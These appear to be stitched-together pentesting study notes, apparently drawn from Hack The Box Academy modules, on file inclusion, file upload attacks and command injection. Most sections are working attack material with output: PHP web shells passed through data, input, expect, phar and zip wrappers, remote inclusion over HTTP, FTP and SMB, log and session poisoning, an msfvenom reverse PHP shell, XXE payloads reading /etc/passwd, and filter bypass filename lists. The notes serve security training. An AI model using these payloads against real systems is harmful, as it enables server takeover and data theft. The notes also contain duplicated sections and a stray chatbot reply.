The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.

#### Checking PHP Configurations

To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the `base64` filter we used in the previous section, as `.ini` files are similar to `.php` files and should be encoded to avoid breaking. Finally, we'll use

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

&nbsp;

&nbsp;

#### Remote Code Execution

With `allow_url_include` enabled, we can proceed with our `data` wrapper attack. As mentioned earlier, the `data` wrapper can be used to include external data, including PHP code. We can also pass it `base64` encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code.

So, our first step would be to base64 encode a basic PHP web shell, as follows:

PHP Wrappers

```shell-session
cube111@local[/local]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass comm

```shell-session
cube111@local[/local]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

ands to the web shell with `&cmd=<COMMAND>`:

&nbsp;

&nbsp;

## Input

```shell-session
ube111@local[/local]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

&nbsp;

&nbsp;

&nbsp;

## Expect

&nbsp;

```shell-session
cube111@local[/local]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

&nbsp;

&nbsp;

# Remote File Inclusion (RFI)

## Verify RFI

In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled. We can check whether this setting is enabled through LFI, as we did in the previous section:

Remote File Inclusion (RFI)

```shell-session
cube111@local[/local]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

&nbsp;

![d712f6cbf965c84889f8f3b71e09566b.png](/resources/d712f6cbf965c84889f8f3b71e09566b.png)

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

&nbsp;

![fff585695d997225d2a7e766f7db99fe.png](/resources/fff585695d997225d2a7e766f7db99fe.png)

&nbsp;

## FTP

As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python's `pyftpdlib`, as follows:

Remote File Inclusion (RFI)

```shell-session
cube111@local[/local]$ sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

&nbsp;

&nbsp;

![1f2e8e11b4e2f16dfa46f71d01aad3e7.png](/resources/1f2e8e11b4e2f16dfa46f71d01aad3e7.png)

&nbsp;

```shell-session
cube111@local[/local]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

&nbsp;

&nbsp;

## SMB

&nbsp;

```shell-session
cube111@local[/local]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell.php`), and specify the command with (`&cmd=whoami`) as we did earlier:

![Shipping containers and cranes at a port with NT AUTHORITYUSR information displayed.](/resources/windows_rfi.png)

As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique is `more likely to work if we were on the same network`, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.

```shell-session
cube111@local[/local]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell.php`), and specify the command with (`&cmd=whoami`) as we did earlier:

![Shipping containers and cranes at a port with NT AUTHORITYUSR information displayed.](https://academy.hackthebox.com/storage/modules/23/windows_rfi.png)

As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique is `more likely to work if we were on the same network`, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.

&nbsp;

&nbsp;

# LFI and File Uploads

&nbsp;

#### Crafting Malicious Image

Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. `shell.gif`), and should also include the image magic bytes at the beginning of the file content (e.g. `GIF8`), just in case the upload form checks for both the extension and content type as well. We can do so as follows:

LFI and File Uploads

```shell-session
cube111@local[/local]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

&nbsp;

&nbsp;

#### Uploaded File Path

Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:

Code: html

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

&nbsp;

&nbsp;

![730574263c4c6984b0e1910d4ccb2ec5.png](/resources/730574263c4c6984b0e1910d4ccb2ec5.png)

&nbsp;

&nbsp;

## Zip Upload

&nbsp;

```shell-session
cube111@local[/local]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

&nbsp;

```shell-session
cube111@local[/local]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

&nbsp;

&nbsp;

![6110606e6fa0b484c817a12685768e82.png](/resources/6110606e6fa0b484c817a12685768e82.png)

&nbsp;

&nbsp;

&nbsp;

## Phar Upload

Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

Code: php

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:

LFI and File Uploads

```shell-session
cube111@local[/local]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Now, we should have a phar file called `shell.jpg`. Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`), as follows:

![Shipping containers and cranes at a port with user data information displayed.](/resources/rfi_localhost.jpg)

As we can see, the `id` command was successfully executed. Both the `zip` and `phar` wrapper methods should be considered as alternative methods in case the first method did not work, as the first method we discussed is the most reliable among the three.

**Note:** There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the `phpinfo()` page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to [This Link](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo).

&nbsp;

&nbsp;

&nbsp;

&nbsp;

# Log Poisoning

## PHP Session Poisoning

Most PHP web applications utilize `PHPSESSID` cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows. The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

&nbsp;

&nbsp;

![44a145a9381a992d4915d7fefadd78bd.png](/resources/44a145a9381a992d4915d7fefadd78bd.png)

&nbsp;

&nbsp;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd![6c6cc535d44b894bb22b1f3e093f2cde.png](/resources/6c6cc535d44b894bb22b1f3e093f2cde.png)

&nbsp;

```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Finally, we can include the session file and use the `&cmd=id` to execute a commands:

![Shipping containers and cranes at a port with PHP notice about an undefined variable.](/resources/rfi_session_id.png)

&nbsp;

&nbsp;

&nbsp;

## Server Log Poisoning

Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. `Nginx` logs are readable by low privileged users by default (e.g. `www-data`), while the `Apache` logs are only readable by users with high privileges (e.g. `root`/`adm` groups). However, in older or misconfigured `Apache` servers, these logs may be readable by low-privileged users.

&nbsp;

By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows. However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations, as will be discussed in the next section.

&nbsp;

&nbsp;

So, let's try including the Apache access log from `/var/log/apache2/access.log`, and see what we get:

&nbsp;

![143998a0390b74e62ed5bb56e7437083.png](/resources/143998a0390b74e62ed5bb56e7437083.png)

&nbsp;

&nbsp;

To do so, we will use `Burp Suite` to intercept our earlier LFI request and modify the `User-Agent` header to `Apache Log Poisoning`:

&nbsp;

![dfa06b31e56589ac873e8e75f4c746aa.png](/resources/dfa06b31e56589ac873e8e75f4c746aa.png)

&nbsp;

&nbsp;

We may also poison the log by sending a request through cURL, as follows:

Log Poisoning

```shell-session
cube111@local[/local]$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
cube111@local[/local]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

&nbsp;

&nbsp;

![57ebbe605a7c82d20cb76e5efbd5c74c.png](/resources/57ebbe605a7c82d20cb76e5efbd5c74c.png)

![cf96b213118b750c863639af1c52ea07.png](/resources/cf96b213118b750c863639af1c52ea07.png)

&nbsp;

**Tip:** The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

&nbsp;

&nbsp;

&nbsp;

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

# Automated Scanning

## Fuzzing Parameters

&nbsp;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters

```shell-session
cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

&nbsp;

There are a number of [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) we can use for this scan. A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the `?language=` parameter we have been testing throughout the module, as follows:

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
 :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
...SNIP...
../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

#### Server Webroot

```shell-session
cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

...SNIP...

: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
```

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
 :: Wordlist         : FUZZ: ./LFI-WordList-Linux
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
...SNIP...
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
```

&nbsp;

&nbsp;

&nbsp;

# File Upload Attacks

# Absent Validation

&nbsp;

We can download any of these web shells for the language of our web application (`PHP` in our case), then upload it through the vulnerable upload feature, and visit the uploaded file to interact with the web shell. For example, let's try to upload `phpbash.php` from [phpbash](https://github.com/Arrexel/phpbash) to our web application, and then navigate to its link by clicking on the Download button:

## Web Shells

```php
<?php system($_REQUEST['cmd']); ?>
```

&nbsp;

```shell-session
cube111@local[/local]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...SNIP...
Payload size: 3033 bytes
```

&nbsp;

&nbsp;

## Client-Side Validation bypass

&nbsp;

&nbsp;

![a6189250fcd673679e047bfbeeab86f1.png](/resources/a6189250fcd673679e047bfbeeab86f1.png)

&nbsp;

&nbsp;

![ee238bf439778770d09c812a49989834.png](/resources/ee238bf439778770d09c812a49989834.png)

&nbsp;

&nbsp;

## Disabling Front-end Validation

&nbsp;

![12a6c6d7b54609172fbca285d8d67cc5.png](/resources/12a6c6d7b54609172fbca285d8d67cc5.png)

&nbsp;

&nbsp;

&nbsp;

# Blacklist Filters

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

&nbsp;

&nbsp;

**Tip:** The comparison above is also case-sensitive, and is only considering lowercase extensions. In Windows Servers, file names are case insensitive, so we may try uploading a `php` with a mixed-case (e.g. `pHp`), which may bypass the blacklist as well, and should still execute as a PHP script.

&nbsp;

There are many lists of extensions we can utilize in our fuzzing scan. `PayloadsAllTheThings` provides lists of extensions for [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and [.NET](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) web applications. We may also use `SecLists` list of common [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt).

&nbsp;

![984fa1336d28e0f1e5ddb12a843a6e57.png](/resources/984fa1336d28e0f1e5ddb12a843a6e57.png)

&nbsp;

&nbsp;

&nbsp;

# Whitelist Filters

&nbsp;

## Double Extensions

The code only tests whether the file name contains an image extension; a straightforward method of passing the regex test is through `Double Extensions`. For example, if the `.jpg` extension was allowed, we can add it in our uploaded file name and still end our filename with `.php` (e.g. `shell.jpg.php`), in which case we should be able to pass the whitelist test, while still uploading a PHP script that can execute PHP code.

&nbsp;

&nbsp;

## Reverse Double Extension

&nbsp;

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

The above configuration is how the web server determines which files to allow PHP code execution. It specifies a whitelist with a regex pattern that matches `.phar`, `.php`, and `.phtml`. However, this regex pattern can have the same mistake we saw earlier if we forget to end it with (`$`). In such cases, any file that contains the above extensions will be allowed PHP code execution, even if it does not end with the PHP extension. For example, the file name (`shell.php.jpg`) should pass the earlier whitelist test as it ends with (`.jpg`), and it would be able to execute PHP code due to the above misconfiguration, as it contains (`.php`) in its name.

&nbsp;

&nbsp;

## Character Injection

Finally, let's discuss another method of bypassing a whitelist validation test through `Character Injection`. We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.

The following are some of the characters we may try injecting:

- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (`shell.php%00.jpg`) works with PHP servers with version `5.X` or earlier, as it causes the PHP web server to end the file name after the (`%00`), and store it as (`shell.php`), while still passing the whitelist. The same may be used with web applications hosted on a Windows server by injecting a colon (`:`) before the allowed file extension (e.g. `shell.aspx:.jpg`), which should also write the file as (`shell.aspx`). Similarly, each of the other characters has a use case that may allow us to upload a PHP script while bypassing the type validation test.

We can write a small bash script that generates all permutations of the file name, where the above characters would be injected before and after both the `PHP` and `JPG` extensions, as follows:

Code: bash

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

&nbsp;

&nbsp;

&nbsp;

# Type Filters

&nbsp;

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

&nbsp;

![84e84010e7ebece93604f1fcda4f3c9e.png](/resources/84e84010e7ebece93604f1fcda4f3c9e.png)

&nbsp;

&nbsp;

## MIME-Type

&nbsp;

We may start by fuzzing the Content-Type header with SecLists' [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) through Burp Intruder, to see which types are allowed. However, the message tells us that only images are allowed, so we can limit our scan to image types, which reduces the wordlist to `45` types only (compared to around 700 originally). We can do so as follows:

Type Filters

```shell-session
cube111@local[/local]$ echo "this is a text file" > text.jpg 
cube111@local[/local]$ file text.jpg 
text.jpg: ASCII text
```

As we see, the file's MIME type is `ASCII text`, even though its extension is `.jpg`. However, if we write `GIF8` to the beginning of the file, it will be considered as a `GIF` image instead, even though its extension is still `.jpg`:

Type Filters

```shell-session
cube111@local[/local]$ echo "GIF8" > text.jpg 
cube111@local[/local]$file text.jpg
text.jpg: GIF image data
```

Web servers can also utilize this standard to determine file types, which is usually more accurate than testing the file extension. The following example shows how a PHP web application can test the MIME type of an uploaded file:

Code: php

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

&nbsp;

&nbsp;

curl -X POST -F "file=@/home/sinner/Documents/oscp/test.txt" -F filename="/tmp/test.txt" http://192.168.185.249:33414/file-upload

&nbsp;

&nbsp;

# Limited File Uploads

## XSS

We can see that the `Comment` parameter was updated to our XSS payload. When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. Furthermore, if we change the image's MIME-Type to `text/html`, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.

Finally, XSS attacks can also be carried with `SVG` images, along with several other attacks. `Scalable Vector Graphics (SVG)` images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to `local.svg`:

&nbsp;

&nbsp;

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

&nbsp;

```shell-session
cube111@local[/local]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' local.jpg
cube111@local[/local]$ exiftool local.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

&nbsp;

&nbsp;

## XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>




source code disclosure

Code: xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

&nbsp;

&nbsp;

&nbsp;

Using XML data is not unique to SVG images, as it is also utilized by many types of documents, like `PDF`, `Word Documents`, `PowerPoint Documents`, among many others. All of these documents include XML data within them to specify their format and structure. Suppose a web application used a document viewer that is vulnerable to XXE and allowed uploading any of these documents. In that case, we may also modify their XML data to include the malicious XXE elements, and we would be able to carry a blind XXE attack on the back-end web server.

Another similar attack that is also achievable through these file types is an SSRF attack. We may utilize the XXE vulnerability to enumerate the internally available services or even call private APIs to perform private actions. For more about SSRF, you may refer to the [Server-side Attacks](https://academy.hackthebox.com/module/details/145) module.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

## Other File Upload Attacks

### 🧪 Injections in File Name

- **Command Injection** via file name:
    
    bash
    
    CopyEdit
    
    ``file$(whoami).jpgfile`whoami`.jpgfile.jpg||whoami``
    
    If used in OS commands (e.g., `mv`), it may execute arbitrary code.
    
- **XSS Injection**:
    
    html
    
    CopyEdit
    
    `<script>alert(window.origin);</script>`
    
    If file name is reflected in the UI.
    
- **SQL Injection**:
    
    sql
    
    CopyEdit
    
    `file';select+sleep(5);--.jpg`
    
    Dangerous if used directly in SQL queries.
    

* * *

### 📁 Upload Directory Disclosure

- **No direct link** to uploaded file? Try:
    
    - **Fuzzing** to find directories
        
    - **LFI/XXE** to read source code
        
    - **IDOR techniques** to locate stored files
        
- **Triggering Errors**:
    
    - Upload file with duplicate name
        
    - Send **two identical requests** simultaneously
        
    - Upload a file with an **extremely long name** (e.g., 5000 chars)
        
    - Errors might disclose **upload paths**
        

* * *

### 🪟 Windows-Specific Attacks

- **Reserved Characters**:
    
    bash
    
    CopyEdit
    
    `*, ?, <, >, |`
    
    Might cause errors or disclosure if unsanitized.
    
- **Reserved File Names**:
    
    bash
    
    CopyEdit
    
    `CON, COM1, LPT1, NUL`
    
    Not allowed as filenames—can be used to cause errors.
    
- **8.3 Filename Convention**:
    
    - Used to refer to files using tilde (~):
        
        bash
        
        CopyEdit
        
        `HAC~1.TXT for hackthebox.txtWEB~.CONF to potentially overwrite web.conf`
        
    - Can lead to:
        
        - Information disclosure
            
        - Denial of Service
            
        - Unauthorized file access
            

* * *

### 🧬 Advanced File Upload Attacks

- Exploitable cases where **automatic processing** occurs:
    
    - Video encoding
        
    - File compression
        
    - File renaming
        
- Vulnerable Libraries:
    
    - Example: **AVI upload → XXE via ffmpeg**
- **Custom code** might hide **unique vulnerabilities**—requires in-depth analysis.
    
- 📚 **Bug bounty reports** are a great source to study advanced file upload techniques.
    

* * *

Let me know if you want this turned into a visual mindmap or want to dive deeper into any technique.

&nbsp;

&nbsp;

## Command Injection Methods

To inject an additional command to the intended one, we may use any of the following operators:

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
| --- | --- | --- | --- |
| Semicolon | `;` | `%3b` | Both |
| New Line | `\n` | `%0a` | Both |
| Background | `&` | `%26` | Both (second output generally shown first) |
| Pipe | `\|` | `%7c` | Both (only second output is shown) |
| AND | `&&` | `%26%26` | Both (only if first succeeds) |
| OR  | `\|` | `%7c%7c` | Second (only if first fails) |
| Sub-Shell | ` `` ` | `%60%60` | Both (Linux-only) |
| Sub-Shell | `$()` | `%24%28%29` | Both (Linux-only) |

&nbsp;

## AND Operator

We can start with the `AND` (`&&`) operator, such that our final payload would be (`127.0.0.1 && whoami`), and the final executed command would be the following:

Code: bash

```
ping -c 1 127.0.0.1 && whoami
```

&nbsp;

&nbsp;

![24d1be4971f710be049f5d49efc80f06.png](/resources/24d1be4971f710be049f5d49efc80f06.png)

&nbsp;

&nbsp;

* * *

## OR Operator

Finally, let us try the `OR` (`||`) injection operator. The `OR` operator only executes the second command if the first command fails to execute. This may be useful for us in cases where our injection would break the original command without having a solid way of having both commands work. So, using the `OR` operator would make our new command execute if the first one fails.

If we try to use our usual payload with the `||` operator (`127.0.0.1 || whoami`), we will see that only the first command would execute:

Other Injection Operators

```
21y4d@local[/local]$ ping -c 1 127.0.0.1 || whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms
```

&nbsp;

&nbsp;

&nbsp;

![b97a8e7d2ac1db591843c3a8fdca0e9c.png](/resources/b97a8e7d2ac1db591843c3a8fdca0e9c.png)

&nbsp;

&nbsp;

## Filter/WAF Detection

## Blacklisted Characters

